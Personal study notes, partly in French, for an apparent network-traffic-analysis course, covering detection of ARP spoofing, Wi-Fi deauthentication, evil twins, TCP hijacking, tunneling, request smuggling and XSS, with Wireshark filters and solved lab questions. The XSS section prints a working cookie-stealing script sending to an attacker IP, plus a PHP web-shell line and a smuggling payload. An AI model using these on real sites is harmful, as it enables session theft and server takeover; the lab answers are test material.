# Link Layer Attacks

## ARP Spoofing & Abnormality Detection
- **How ARP Works?:**
    - `ARP Request` >> broadcast to all machines asking the certain IP address to know its MAC
        address, >> this request is sent to all hosts in the network
    - `ARP Reply` >> the host with requested IP address responds that I am at this MAC address
    - **On receiving this response, Host A updates its ARP cache with the new IP-to-MAC mapping.**

- **ARP Poisoning & Spoofing**
    - *Scenario:*
        1. An attacker knows two hosts: HOST#1 and HOST#2 >> Goal is to be in the middle
        2. Attacker sends to HOST#1 >> saying that IP of HOST#2 is at this MAC address (which is attacker's MAC)
        3. The same process: sends to HOST#2 >> saying that IP of HOST#1 is at this MAC (which is attacker's MAC)
    - *Two Possible Later Movements*
        1. Attacker can forward the traffic to two hosts through itself (being in the middle)
        2. Or just drops the traffic and two hosts does not know what's happening

    - *Background Info*
        1. After the attackers actions, ARP Cache of two victims will be updated accordingly by wrong MAC address

- **Detection**
    1. **Static ARP Entries** >> disallowing easy rewrites and poisoning of the ARP cache
        - However, necessitates increased maintenance and oversight in our network environment.
    2. **Switch and Router Port Security**
        - Only authorized devices can connect to the specified ports
        -
    3. **Not Asked ARP Replies**
        - suspicious when >> one host broadcasts `ARP requests and replies` to another host
        - Why suspicious? >> `sending ARP replies without being asked`, it's trying to falsely associate its MAC address with another IP
- **ARP opcodes in Wireshark**
    1. `arp.opcode == 1` >> ARP Requests
    2. `arp.opcode == 2` >> ARP Replies

    - IN case we have different MAC for the single IP address >> check out with:
        - `arp -a | grep 50:eb:f6:ec:0e:7f` >> validate this on a Linux system

- **Finding an anomaly:**
    - One IP in the system with two MAC addresses
    - `(arp.opcode) && ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))`
    - `eth.src and eth.dst` to specify MAC
    -
    - `eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba`
        - this shows abnormalities in Wireshark


- **Practical Challenge:**
    1.  Inspect the ARP_Poison.pcapng file, part of this module's resources, and submit the total count of ARP requests (opcode 1)
        that originated from the address 08:00:27:53:0c:ba as your answer.

    **Solved:**
    - J'ai utilise le command: `arp.opcode == 1 and eth.src == 08:00:27:53:0c:ba`
    - Voila, j'ai obtenu le drapeau

## ARP Scanning & Denial of Service
- **Red Flags for ARP Scanning:**
    1. Broadcast ARP requests sent to sequential IP addresses (.1,.2,.3,...)
        - that's what Nmap does >> *goal to find the live host*
    2. Broadcast ARP requests sent to non-existent hosts
    3. Potentially, an unusual volume of ARP traffic originating from a malicious or compromised host

    4. **ARP requests are being propagated by a single host to all IP addresses in a sequential
       manner.**

- **Identifying Denial-of Service:**
    - `arp.opcode` >> human eagle >> experienced >> eyes

- **Responding To ARP Attacks:**
    - **Tracing and Identification:** First and foremost, the attacker's machine is a physical entity located somewhere.
    - **Containment:** To stymie any further exfiltration of information by the attacker,
    - Contemplate `disconnecting or isolating the impacted area` **at the switch or router level**.

- **Practical Challenge:**
    1. Inspect the ARP_Poison.pcapng file, part of this module's resources, and submit the first MAC address
       that was linked with the IP 192.168.10.1 as your answer.

    **Solved:**
    - Comment j'ai trouve ce reponse: d'abbord, j'ai trouve quand IP Adrress 192.168.10.1 est utilise la promiere fois
    - Apres, quelq'un a envoye le faux request
    - Voila, j'ai obtenu le drapeau

## 802.11 Denial of Service
- **Scenario:**
    - `802.11` >> `Wi-Fi` >>  to capture >> require a WIDS/WIPS system or a wireless interface equipped with monitor mode
    - **Setting to Monitor Mode:**
        - `iwconfig` >> `sudo airmon-ng start wlan0`
        - `sudo ifconfig wlan0 down` >> `sudo iwconfig wlan0 mode monitor` >> `sudo ifconfig wlan0 up`
        - Make sure it's in monitor mode >> `iwconfig`

- **Capturing 802.11 Traffic:**
    - `airodump-ng.` >> the tool we use >> `tcpdump` also an option
        - `sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw`
            - `-c` >> to specify AP's channel
            - `-w` >> output file

- **How Deauthentication Attacks Work:**
    - For what reasons?
        1. To capture the WPA handshake to perform an offline dictionary attack
        2. To cause general denial of service conditions
        3. To enforce users to disconnect from our network, and potentially join their network to retrieve information

    - How it happens:
        1. The attacker will fabricate an `802.11 deauthentication frame` pretending it originates from our `legitimate access point.`
        2. As a result, one of the clients may be disconnected
        3. Often, the client will reconnect and go through the handshake process `while the attacker is sniffing.`
        -
        **This attack operates by the attacker spoofing or altering the MAC of the frame's sender.**
        -
        **The client device cannot really discern the difference without additional controls like IEEE 802.11w (Management Frame Protection)**

- **Detection**
    - Most of the time, the tools for this attack: `aireplay-ng` and `mdk4` >> they use reason `code 7` for **deauthentication.**
    - AP's BSSID == MAC Adrress

    1. Limit our view to traffic from our AP's BSSID (MAC)
        - `wlan.bssid == xx:xx:xx:xx:xx:xx`

    2. Look at the deauthentication frames from our BSSID or an attacker pretending to send these from our BSSID
        - `(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)`
        - `wlan.fc.type == 00`         >>  type of frame >> *management* >> with `00`
        - `wlan.fc.type_subtype == 12` >> subtype >> *deauthentication* >> with `12`

    3. Look for the `Reason Code:`
        - You see that ` reason code 7 was utilized.`

    4. More filtered command:
        - `(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)`

- **Attacker is not Fool**
    1. The attacker changes the `reason codes` every often to avoid any alarms by IPS/IDS
    2. sign by **revolving reason codes.** >> different reason codes

- **Detection:**
    - *The trick to this technique of detection is incrementing like an attacker script would. We would first start with reason code 1.*
    - `(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)`
    - the same for reason code 2
    - for code 3..

- **Protection:**
    1. Enable IEEE 802.11w (Management Frame Protection) if possible
    2. Utilize WPA3-SAE
    3. Modify our WIDS/WIPS detection rules

- **Finding Failed Authentication Attempts:**
    1. *You notice an excessive amount of association requests coming from one device*
    2. To filter for these we could use the following.
        - `(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1)
           or (wlan.fc.type_subtype == 11)`
    3. *important for us to be able to distinguish between legitimate 802.11 traffic and attacker traffic.*

- **Practical Challenge:**
    1. Inspect the deauthandbadauth.cap file, part of this module's resources, and submit the total count of deauthentication frames as your answer.

    **Solved:**
    - J'ai utilise ce command pour ca: `(wlan.bssid == f8:14:fe:4d:e6:f1) and (wlan.fc.type == 00) && (wlan.fc.type_subtype == 12)`
    - `00` >> pour management
    - `12` >> pour indiquer de-authentication
    - Voila, j'ai trouve le drapeau!

## Rogue Access Point & Evil-Twin Attacks
- **Rogue Access Point Goals:**
    - *A rogue access point primarily serves as a tool to circumvent perimeter controls in place.*
    - *Primary function is to provide unauthorized access to restricted sections of a network.*

- **Evil Twin:**
    - Most of the time, These access points `are not` connected to our network
    - Instead, they are `standalone access points`, which might have `a web server` or something else to `act as a man-in-the-middle for wireless clients`

    **The idea is that these Rogue, Evil Twin >> the same name but weak security to sniff the credentials**
    - `to harvest wireless or domain passwords`

- **Detection:**
    - Utilize the `ESSID` filter for `Airodump-ng` to detect Evil-Twin style access points.
        - `sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw` >> it shows if two same-SSID exist

    - Wireshark >> `(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)`
        - type 00 >> management >>
        - subtype 8 >> `display Beacon Frames` >>
            - *contain essential information such as the SSID (network name), supported data rates, and
            - the channel on which the access point is broadcasting.*
            - They are also used by wireless clients to discover and connect to available networks.

    - **Beacon analysis is crucial in differentiating between genuine and fraudulent access points.**
        1. Check First >> `Robust Security Network (RSN) information`
            - Information to clients about the `supported ciphers`, among other things.
            - For the `legit AP` >> it shows >>  WPA2 is supported with `AES and TKIP with PSK as its authentication mechanism.`
            - For the `illegitemate AP` >> it shows in RSN info >> these info is missing >> suspicious

    - **Attacker is not a Fool:**
        1. For example, an attacker might `employ the same cipher` that our access point uses, making the detection of this attack more challenging.
        -
        2. Under such circumstances, we could explore other aspects of the beacon frame: `vendor-specific information`,
            - which is likely absent from the attacker's access point.

- **Finding a Fallen User:**
    - To filter exclusively for the evil-twin access point, we would employ the following filter.
        - `(wlan.bssid == F8:14:FE:4D:E6:F2)`
        - Following this, if we see any of our clients is trying to connect to suspicious network
            through this AP >> then it's red flag
        - ARP requests emanating from a client device connected to the *suspicious network* >> potential compromise indicator.
        - The client >> `MAC Address` >> `Its Host Name`

- **Practical Challenge:**
    1. Inspect the rogueap.cap file, part of this module's resources, and enter the MAC address of the Evil Twin attack's victim as your answer.

    **Solved:**
    - D'abbord, j'ai identifie le twin-evil MAC address
    - Apres, J'ai utilise ce command: `wlan.bssid == F8:14:FE:4D:E6:F2`
    - C'etait interessant que il y a des ARP requests >>
    - Voila, la promiere demande avec ARP >> il m'a donne la reponse!

# Detect Network Abnormalities

- IP Layer >> to transfer packets from one hop to another
- this layer has `no mechanisms` to identify when packets are `lost, dropped, or otherwise tampered with`

## Fragmentation Attacks
- **Packet Fields:**
    - `Length` >> just IP Header Length
    - `Total Length` >> entire length of the IP packet, including any relevant data.
    - `Fragment Offset` >> this offset is to reassemble the packets upon delivery to the host

- **Abuse of Fragmentation:**
    - splitting the packets and reassembling them upon delivery
    - Maximum Transmission Unit >> **MTU** >> the standard to divide these large packets into equal sizes to accommodate the entire transmission
    - **last packet will likely be smaller** >> is just to give instructions how to reassemble the packets

- **Commonly, attackers might abuse this field for the following purposes:**
    1. `IPS/IDS Evasion` >> when IPS/IDS do not reassemble fragmented packets to inspect as a whole
    2. `Firewall Evasion` >> Through fragmentation, an attacker could likewise evade a firewall's controls
    3. `Firewall/IPS/IDS Resource Exhaustion` >> *Suppose an attacker were to craft their attack
            to fragment packets to a very small MTU (10, 15, 20,) and so on*

    - Usually >> MTU == 1500 bytes >> if MTU is 15 >>  A 1500-byte payload with MTU = 10 bytes = 150+ fragments!
    - The packet gets broken into a huge number of tiny fragments.
    - This causes for resource-intensive process

    4. `Denial of Service` >> utilize fragmentation to send IP packets exceeding `65535 bytes` through ping or other commands.

- **Solution:**
    - **The IDS/IPS/Firewall should act the same as the destination host,
    - in the sense that it waits for all fragments to arrive to reconstruct the transmission to perform packet inspection.**

- **Detection:**
    1. notice several ICMP requests going to one host from another
    2. attacker might define a maximum transmission unit size >> `nmap -f 10 <host ip>`
    3. a ton of fragmentation from a host can be an indicator of this attack
    4. indicator of a fragmentation scan >> the single host to many ports responds

- **Practical Challenge:**
    1. Inspect the nmap_frag_fw_bypass.pcapng file, part of this module's resources, and
       enter the total count of packets that have the TCP RST flag set as your answer.
    -
    **Solved:**
    - J'ai compris que j'ai besoin de nombre des [RST] et aussi[ RST, ACK]
    - Je sais que la valeur de [RST] flag >> 0x004 et [RST, ACK] >> 0x0014 car [ACK] est 0x0010
    - Aller, je cris deux commands pour ca: `tcp.flags == 0x004 or tcp.flags == 0x0014`
    - Voila, j'ai obtenu le nombre correcte de RST >> c'est fini!

## IP Source & Destination Spoofing Attacks
- **Key Practices:**
    - Whenever consider IPv4 or IPv6 addresses in NTA:
        1. **The Source IP Address should always be from our subnet**
        2. **The Source IP for outgoing traffic should always be from our subnet**

- **Attack Ways:**
    1. `Decoy Scanning` >> to avoid firewalls >> attacker changes IP address to the one in the same
       subnet as the target host >> it avoids firewall check

    2. `Random Source Attack DDoS` >> random source hosts send traffic to one port of the targeted host

    3. `LAND Attacks` >> when the source address is same as destination >> goal is DDoS

    4. `SMURF Attacks` >> attacker chooses a victim >> victim is a source address holder
       then >> source sends different large ICMP packets to many different hosts >> these hosts respond
       to the source causing DDoS attack to the source (victim)

- **Finding Decoy Scanning Attempts**
    1. Strange Behaviour:
        - Initial Fragmentation from a fake address
        - Some TCP traffic from the legitimate source address

    2. Fight:
        - *Have our IDS/IPS/Firewall act as the destination host would*
        - *Watch for connections started by one host, and taken over by another*

- **Finding Random Source Attacks:**
    1. Single Port Utilization from random hosts
    2. Incremental Base Port with a lack of randomization
    3. Identical Length Fields

- **Finding Smurf Attacks:**
    1. The attacker will send an ICMP request to live hosts with a spoofed address of the victim host
    2. The live hosts will respond to the legitimate victim host with an ICMP reply
    3. This may cause resource exhaustion on the victim host

    4. *Sometimes attackers will include fragmentation and data on these ICMP requests to make the traffic volume larger.*

- **Finding LAND Attacks:**
    1. attacker spoofes the source IP address to be the same as the destination.
    2. source uses different ports to "single port" of the destination

- **Practical Challenge:**
    1. Inspect the ICMP_smurf.pcapng file, part of this module's resources, and enter the total number of attacking hosts as your answer.

    **Solved:**
    - J'ai vu le soule IP address >> et voila c'est fini
    - Pour ca, tu dois voir bien!!

## IP Time-to-Live Attacks
1. Set a very low TTL on their IP packets in order to attempt to evade firewalls, IDS, and IPS systems.
2. The attacker will craft an IP packet with an intentionally low TTL value (1, 2, 3 and so on).
3. Through each host that this packet passes through this TTL value will be decremented by one until it reaches zero.
4. Upon reaching zero this packet will be discarded. The attacker will try to get this packet discarded
    before it reaches a firewall or filtering system to avoid detection/controls.
5. When the packets expire, the routers along the path generate ICMP Time Exceeded messages and send them back to the source IP address.

- **Holy Goal >> is to analyze the network, mapping, knowing where the controls are**

- Network Nmap >> port scanning tools

## TCP Handshake Abnormalities
- **TCP Flags:**
    - `URG` >> This flag is to denote urgency with the current data in stream.
    - `ACK` >> Acknowledges the receipt of the data
    - `PSH` >> Push >> This flag instructs the TCP stack to immediately deliver the received data to the application layer, and bypass buffering
        - buffering >> **temporary storage** >> where tcp data in OS level will be stored then delivered
    - `ECN` >> Explicit Congestion Notification >> let the hosts know to avoid unnecessary re-transmissions.

- **Strange Conditions:**
    1. Too many flags of a kind or kinds
    2. The usage of different and unusual flags
    3. Solo host to multiple ports, or solo host to multiple hosts -

    - **Excessive SYN Flags:**
    1. `SYN Scans` - In these scans the behavior will be as we see, however the attacker will pre-emptively end the handshake with the RST flag.
    2. `SYN Stealth Scans` >> *attacker will attempt to evade detection by only partially completing the TCP handshake.*

    - **NO Flags:**
    1. If the port is open - The system will not respond at all since there is no flags.
    2. If the port is closed - The system will respond with an RST packet.

    - **Too Many ACKs:**
    1. If the port is open - The affected machine will either not respond, or will respond with an RST packet.
    2. If the port is closed - The affected machine will respond with an RST packet.

    - **Excessive FINs:**
    1. If the port is open - Our affected machine simply will not respond.
    2. If the port is closed - Our affected machine will respond with an RST packet.

    - **Xmas Tree Scan:**
    1. to throw spaghetti at the wall. In that case, they might utilize a Xmas tree scan >>  they put all TCP flags on their transmissions.


- **Practical Challenge:**
    1.  Inspect the nmap_syn_scan.pcapng file, part of this module's resources, and
        enter the total count of packets that have the TCP ACK flag set as your answer.

    **Solved:**
    - Pour trouver ce drapeau >> je sais que [ACK] >> `tcp.flags == 0x0010` et un extra du ciel!!
    - Voila, j'ai obtenu le drapeau

## TCP Connection Resets & Hijacking
    1. TCP does not provide the level of protection
    2. from having their connections terminated or hijacked by an attacker. >> Malheuresement

- **TCP Connection Termination:**
    1. The attacker will spoof the source address to be the affected machine's
    2. The attacker will modify the TCP packet to contain the RST flag to terminate the connection
    3. The attacker will specify the destination port to be the same as one currently in use by one of our machines.

    - **Detection:**
        - *Suppose, the IP address 192.168.10.4 is registered to aa:aa:aa:aa:aa:aa in our network device list,
          and we notice an entirely different MAC sending these like the following.*

- **TCP Connection Hijacking:**
    1. the attacker will actively monitor the target connection they want to hijack.
    2. then conduct `sequence number prediction` in order to `inject their malicious packets` in **the correct order.**
    3. During this injection they will spoof the source address to be the same as our affected machine.

    **Key Point:**
    1. The attacker will need to block ACKs from reaching the affected machine in order to continue the hijacking.
        - *IF ACK reaches to the affected machine, then it disrupts the connection which attacker is
            doing >> it's kinda a process man in the middle*
    2. They do this either through delaying or blocking the ACK packets.

    3. We may see as we saw in ARP Poisoning, that **TCP Retransmissions** >> [PSH, ACK]
        - Here, as the server does not get the
        - Why it happens since:
            - *Out-of-order packets
            - Bad TCP sequence numbers
            - Confusion in the TCP stack*
        - **As a result, the client does not receive expected acknowledgments, so it assumes:
                “Packet was lost — let me send it again.”
        - That’s why we see retransmissions in Wireshark.**


- **Practical Challenge:**
    1. Inspect the TCP-hijacking.pcap file, part of this module's resources, and
       enter the username that has been used through the telnet protocol as your answer.

    **Solved:**
    - J'ai trouver ou Telnet Protocol etait >> apres >> j'ai teste les details
    - TCP Stream >> Voila >> j'ai obtenu le drapeau

## ICMP Tunneling
- **Key Ideas:**
    - Tunneling >> **to exfiltrate data from one location to another.**
    - Mostly, attackers >> may utilize proxies to bypass our network controls, or protocols that our systems and controls allow.

    - **SSH Tunneling, proxy-based, HTTP, HTTPs, DNS, and other types can be observed in similar ways** >>
    - Why tunneling >> the idea is that >> to bypass normal network security controls >> and send
        command & controls

- **ICMP Tunneling:**
    - an attacker wants to exfiltrate data to the outside world or another host in the data field in an ICMP request.
    - **Normal ICPM request == 48 bytes**
    - Seeing anything >> like **ICPM == 38000 bytes** >> super abnormal >> data appended to this request
    - In wireshark >> need to check each packet >> details >>
    - Sometimes, they are plain text and sometimes they are in encrypted version so that check them;
    - Point here >> **attacker sends small, normal-looking ICMP requests to the victim
        - they include instructions, commands**
    - **Then, victim sends large amount of data responding as a reply >> passwords, or other data the attacker wanted**

- **Preventing ICMP Tunneling:**
    1. Block ICMP Requests
    2. Inspect ICMP Requests and Replies for Data - Stripping data, or inspecting data for malicious content on these requests

- **Practical Challenge:**
    1.  Enter the decoded value of the base64-encoded string that was mentioned in this section as your answer.

    **Solved:**
    - j'ai deja ca >> `echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d`
    - Voila >> `This is a secure key: xxxxxxxxxxxx`


# Application Layer Attacks
- Important Info
## HTTP/HTTPs Service Enumeration
- **Fuzzing Attempts:**
    1. Excessive HTTP/HTTPs traffic from one host
    2. Referencing our web server's access logs for the same behavior

    3. Attackers will attempt to **fuzz our server** to *gather information* `before attempting to launch an attack.`

    4. WAF >> **Web Application Firewall** >> We need it to protect

- **Finding Directory Fuzzing:**
    1. Goal >> to find all possible web pages and locations in our web applications
    2. `http` >> all HTTP related >> `http.request` >> if want only requests

    - **Scenario:**
    1. A host will repeatedly attempt to access files on our web server which do not exist (response 404).
    2. A host will send these in rapid succession.

- **Detection:**
    - Apache Server >> `cat access.log | grep "192.168.10.5"`
    - `cat access.log | awk '$1 == "192.168.10.5"'`
    -
    - To limit traffic to just one host we can employ the following filter:
        - `http.request and ((ip.src_host == <suspected IP>) or (ip.dst_host == <suspected IP>))`
    - Another option: in Wireshark >> `Follow > HTTP Stream`

- **Attackers are not fool:**
    1.  attackers will do the following to prevent detection
        - *they take a time between each request >> so no immediate*
        - *Send these responses from multiple hosts or source addresses.*

- **Prevent Fuzzing:**
    1. Configure WAF, Web Server to avoid those scanners by **returning proper response codes**
    2. Block the suspicious IPs at WAF

- **Practical Challenge:**
    1.  Inspect the basic_fuzzing.pcapng file, part of this module's resources, and
        enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.

    **Solved:**
    - J'ai utilise le command: `http.request == GET and tcp.port == 80`
    - Voila, j'ai obtenu le drapeau


## Strange HTTP Headers
- **Finding Strange Host Headers:**
    - only http, exclude the legitimate traffic (web server's real IP)
    - `http.request and (!(http.host == "192.168.10.7"))`

    - Then check each HTTP info in Wireshark >> you see that **HOST: 127.0.0.1 or admin**
    - **use different host headers to gain levels of access** >>
    - which *they would not normally achieve through the legitimate host.*
    - `They may use proxy tools like burp suite or others to modify these before sending them to the server`
    -
    - **Prevention:**
        1. Ensure that our virtualhosts or access configurations are setup correctly to prevent this form of access.
        2. Ensure that our web server is up to date.

- **Analyzing Code 400s and Request Smuggling:**
    - `http.response.code == 400` >> nice to start the malicious requests
    - they show that user, client asked something bad from the server

- **Deep Analyze:**
    1. In this request >> we found **HTTP Stream**
        - with the following request >>
        - `GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.             0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5`

    2. If decoded in the server level:
        - `GET /login.php?id=1 HTTP/1.1
          Host: 192.168.10.5

          GET /uploads/cmd2.php HTTP/1.1
          Host: 127.0.0.1:8080

          HTTP/1.1
          Host: 192.168.10.5`

    3. Why it is dangerous?
        1. `The first request` looks good >> and can be approved by `fronted server` > the Apache
            - so it only checks the first part
        2. Then >> The back-end will get it >> its behavior is to run all these requests, commands
            - here is the hot problem
        3. The second request >> `access to cmd2.php` is to give remote control inside this server `using (127.0.0.1) loopback`
            - problem >> access to `Web shells (cmd2.php)` >> `Internal admin panels (127.0.0.1:8080/admin)`
        4. The third request >> *acts as garbage input, padder, or to mess with server's parsing
           logic to bypass the protections, or insert extra requests*

    4. Overall that's what *HTTP Request Smuggling*
        - delivering unwanted HTTP requests in a sneaky ways
    5. To understand better look at "How Web Server Works" below!

- **Practical Challenge:**
    1. Inspect the CRLF_and_host_header_manipulation.pcapng file, part of this module's resources, and
       enter the total number of HTTP packets with response code 400 as your answer.

    **Solved:**
    - J'ai utilise le command: `http.response.code == 400`
    - Voila, c'est fini!


## How Web Server Works
- How Usually **Web Servers** are working >> their architecture:
        - **Client /Browser >> Fronted-Server >> Backend-Server >> Database**
    2. What's in Fronted Server?
            - *Apache, Nginx, Load Balancer*
            - Listens for public HTTP/HTTPS traffic. >> Handles TLS (SSL) encryption.
            - Caches or compresses static files (CSS, JS, images). >> **Forwards requests to the back-end server.**
    3. What's in Backend-Server?
            - *PHP-FPM, Node.js, Flask, Django, Tomcat*
            - `Runs your actual application code.`
            - Connects to databases.
            - Generates the dynamic HTML response.

- How **Apache** Works?
        1. It's Fronted-Server >> it takes the http requests first
        2. In this point >> it tries to *hide internal part of the server such as backend*
        3. It does *security filtering*
           - Block bad IPs
           - Filter malicious input
           - Add SSL/TLS (HTTPS)
           - Do basic firewall duties
           - Why all this? >> *to safeguard the back-end and less exposed to the internet*
        4. It does *load balancing*
           - send traffic  >> Server #1 >> #2 >> #3
        5. It does *URL Rewriting*
           - let's say >> the apache got this >> `/categories/books`
           - it rewrites >> `/categories.php?id=books`
           - Why? to have **nice clean URL for the user**

- How **Apache May Talk To Back-end?:**
        1. Usually through `reverse proxy:`
            - forward proxy >> `client > proxy > internet` (protects client)
            - reverse proxy >> `server-side proxy` >> the client > server > `server proxies it internally to a hidden backend app.`
            - so it protects server
           - `User → Reverse Proxy (Apache) → Backend`

- **Some Difference in Request Handling**
        1. Apache may send `raw HTTP requests` without filter/ normalizing / sanitizing
        2. Backend may `execute the malicious requests`
        **Or**
        1. The front-end server (Nginx) might read `only the first part`
        2. But the back-end server (PHP-FPM) might read `the entire thing`

## Cross-Site Scripting (XSS) & Code Injection Detection
- **How it works**
    1. attacker puts malicious code in web page through the user input (comments)
    2. then when other users visit our website, this code in the comments let's say will be executed
    3. then it sends other visitors credentials to the attacker

    4. Script example in JavaScript
        - `<script>
                // 1. When the page finishes loading, run the function
                window.addEventListener("load", function() {

                // 2. Set the attacker's server URL where data will be sent
                const url = "http://192.168.0.19:5555";

                // 3. Prepare the data to send: the user's cookies, URL-encoded
                const params = "cookie=" + encodeURIComponent(document.cookie);

                // 4. Create a new HTTP request object
                const request = new XMLHttpRequest();

                // 5. Configure the request to send a GET to attacker's server with cookies as a query parameter
                request.open("GET", url + "?" + params);

                // 6. Send the request (exfiltrate the cookies)
                request.send();
            });
        </script>`
        -
        5. The honey part is that >> victim sends `GET` request to the attacker
            - this request includes cookies as query parameter
            -
- **Detection:**
    1. While analyzing NTA, Give a red flag to the *non-webser hosts* who is getting `GET` reqeusts
    2. Good amount of requests were being sent to an `internal "server,"` >> **we did not recognize**
    3. Indication of cross-site scripting.

- **Code Injection**
    1. Attacker may put some codes into these fields(comments section) like the following two examples.
        - `<?php system($_GET['cmd']); ?>` >> **To get command and control through PHP.**
        - `<?php echo `whoami` ?>`

- **Preventing XSS and Code Injection**
    1. Sanitize and handle user input in an acceptable manner.
    2. Do not interpret user input as code.

- **Practical Challenge:**
    1. Inspect the first packet of the XSS_Simple.pcapng file, part of this module's resources, and
       enter the cookie value that was exfiltrated as your answer.

    **Solved:**
    - J'ai utilise ce process >>
    - J'ai choisi le premier code >> avec GET >> `Follow > HTTP Stream`

## SSL Renegotiation Attacks
- **How HTTPs Works with Server?:**
    1. `Handshake` >> to clarify which encryption algorithms to use, & exchange certs
    2. `Encryption` >> they use the agreed algorithm to encrypt the further data
    3. `Further Data Exchange` >> start to exchange data: web pages, images, or other web resources.
    4. `Decryption` >> happens in both sides

- **Goal of SSL Renegotiation:**
    - *Negotiate the session to the lowest possible encryption standard.* \\

- **TLS Handshake Process:**
    1. Client and Server finished `TCP Handshake`
    2. Then immediately, client sends `Client Hello` to Server
        - This message includes: TLS/SSL versions and encryption algorithms to choose by server, and some random data (nonces)
    3. Then, Server sends `Server Hello` to Client
        - This message includes: chosen TLS/SSL version, chosen encryption algorithm, and additional (nonces)
    4. `Certificate Exchange` >> Server sends its certificate >> *proves its identity >> includes public key*
    5. `Key Exchange` >> client generates *premaster secret* >> it encrypts this secret using public key of server >> then sends it to server
    6. `Session Key Derivation` >> *both the client and the server use the nonces exchanged in the first two steps*
        - along with the *premaster secret* to **compute the session keys**
        - **These session keys are used for symmetric encryption and decryption of data during the secure connection.**
        - That's how symmetric key is generated, I guess
    7. `Finished Messages` >>  verify the handshake is completed and successful
        - This message: includes the hash of `all previous handshake messages` and `is encrypted using the session keys.`

    8. `Secure Data Exchange` >> all set up is done >> start the communication

- **Diving into SSL Renegotiation Attacks:**
    1. *To find irregularities in handshakes:* in Wireshark or TCPDump
        - `ssl.record.content_type == 22` >> **22 specifies handshake messages only**
    2. **What we look for the Renegotiation Attacks:?**
        1. `Multiple Client Hellos` >> *attacker repeats this message to trigger renegotiation and hopefully get a lower cipher suite.*
        2. `Out of Order Handshake Messages` >> when **the server receives a client hello after completion of the handshake.**

    3. **Impact:**
        - `Denial of Service` - *SSL renegotiation attacks consume a ton of resources on the server side*
        - `SSL/TLS Weakness Exploitation` >> *potentially exploit vulnerabilities with our current implementation of cipher suites.*

- **Practical Challenge:**
    1.  Inspect the SSL_renegotiation_edited.pcapng file, part of this module's resources, and
        enter the total count of "Client Hello" requests as your answer.

    **Solved:**
    - J'ai utilise ce command: `ssl.record.content_type == 22` >> pour voir combien de Hello messages
    - Voila, j'ai obtenu le drapeau


## Peculiar DNS Traffic
- **DNS Query Process**
    1. Query Initiation
    2. Local Cache Check
    3. Recursive Query >> client then sends its recursive query to its configured DNS server `(local or remote).`
    4. Root Servers >> The DNS resolver, if necessary, starts by querying the root name servers to `find the authoritative name servers`
        - to ask from  for the **top-level domain (TLD)**
        - There are 13 root servers distributed worldwide.
    5. TLD Servers >> The **root server** then responds with the authoritative name servers for the TLD (aka .com or .org)
    6. Authoritative Servers >> The DNS resolver then queries the TLD's authoritative name servers for the second-level domain (aka hackthebox.com).
    7. Domain Name's Authoritative Servers >> Finally, the DNS resolver queries the domains authoritative name servers
       to obtain the IP address associated with the requested domain name (aka academy.hackthebox.com).

    8. Response >> Voila, enfin, il a recu la reponse pour FQDN ou pour IP address

- **DNS Reverse Lookups/Queries**
    1. Query Initiation
    2. Reverse Lookup Zones >>  DNS resolver checks if it is authoritative for the reverse lookup zone
       that corresponds to the IP range as determined by the received IP address.
       Aka 192.0.2.1, the reverse zone would be 1.2.0.192.in-addr.arpa

    3. PTR Record Query >> Pointer ::The DNS resolver then looks for a PTR record on the reverse lookup zone that corresponds to the provided IP address.

- **DNS Record Types:**
    1. `A` >> Address >> IPv4
    2. `AAAA` >> IPv6 Address
    3. `CNAME` >> Canonical Name >> *creates an alias for the domain name. Aka hello.com = world.com*
    4. `MX` >> Mail Exchange >> the mail server responsible for receiving email messages on behalf of the domain.
    5. `NS` >> Name Server >>    an authoritative name servers for a domain.
    6. `PTR` >> Pointer >> used in reverse queries to map an IP to a domain name
    7. `TXT` >> text >> specify text associated with the domain
    8. `SOA` >> dministrative information about the zone

- **Finding DNS Enumeration Attempts:**
    1. `dns` >> look for any requests include >> **ANY** indication of DNS enumeration and possibly even subdomain enumeration
    2. Goal is to find all info: DNS Records, subdomains,
    3. This attack is called **DNS Amplification**
        - The idea >> sending small DNS request but respond will be more
        - small request (e.g., 60 bytes) can trigger a much larger response (e.g., 4,000+ bytes), overwhelming the victim.

- **Finding DNS Tunneling:**
    - Happens through the `TXT` record
    - Then check for the data details >> parfois plaintext >> encoded >> encrypted
    - Need to run multiple times `base64 -d` like trois fois >> pas toujours mais parfois
    -
    - **TXT**
    - normalement >> its size >> 100-300 bytes
    - overall UDP packet == 512 bytes since it uses UDP 53
    - attackers may assign more value to TXT
    - one TXT string == 255 bytes maximum
    - 1 KB == 1024 bytes >> 1 MB == 1024 KB
    -
- **Goals of using DNS Tunneling:**
    1. Data Exfiltration
    2. Command and Control
    3. Bypassing Firewalls and Proxies
    4. Domain Generation Algorithms (DGAs) >> *advanced malware will utilize DNS tunnels to communicate back to their command and control servers
          that use dynamically generated domain names through DGAs.*


## What is IPFS?
- **IPFS** >>  Interplanetary File System
    - **Decentralized way to store and share files on the internet**
    1. Upload a file → IPFS breaks it into chunks.
    2. Each chunk gets a unique hash (like a fingerprint).
    3. Files are stored across many computers (nodes).
    4. To get a file, you ask the network for its hash. called >> CID >> Content Identifier
    5. Any node with that chunk sends it to you.
    **No central server. Files are found by content, not by location (like a URL).**

    6. How it is reassembled:
    - IPFS uses a Merkle DAG (a kind of tree):
